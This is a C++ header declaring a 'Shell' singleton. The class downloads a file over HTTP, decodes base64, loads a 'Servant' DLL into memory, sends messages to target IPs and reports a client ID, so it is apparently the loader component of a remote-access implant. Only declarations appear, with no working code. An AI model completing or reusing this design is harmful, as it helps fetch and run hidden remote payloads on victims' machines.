#pragma once
#include "memdll/MemLoadDll.h"
#include "CommNames.h"

class Shell
{
	DECLARE_SINGLETON(Shell);
public:
	BOOL Servant_SendMsg(const LPBYTE pData, DWORD dwSize, COMM_NAME commname, ULONG targetIP);
	BOOL Servant_GetCID(GUID& guid);

private:
	BOOL StartLoading();
	void Stop();

	static DWORD WINAPI LoadingThread(LPVOID lpParameter);
	void LoadingProc();

	BOOL DecodeBase64(LPCSTR base64Encoded, DWORD dwBase64Length, ByteBuffer& byteBuffer) const;
	BOOL HttpDownloadFile(LPCTSTR url, LPCTSTR localFilepath);
	BOOL LoadServant();

private:
	typedef BOOL (*FnInitServant)(const PCONFIG_INFO pConfigInfo);
	typedef void (*FnDeinitServant)();
	typedef BOOL (*FnSendMsg)(const LPBYTE pData, DWORD dwSize, COMM_NAME commname, ULONG targetIP);
	typedef GUID (*FnGetCID)();

private:
	tstring			m_dllpath;
	volatile LONG	m_bWorking;
	Thread			m_loadingThread;
	Handle			m_hExitEvent;
	tstring			m_clientid;
	
	CMemLoadDll*	m_pServant;
	FnInitServant	m_fnInitServant;
	FnDeinitServant	m_fnDeinitServant;
	FnSendMsg		m_fnSendMsg;
	FnGetCID		m_fnGetCID;
};
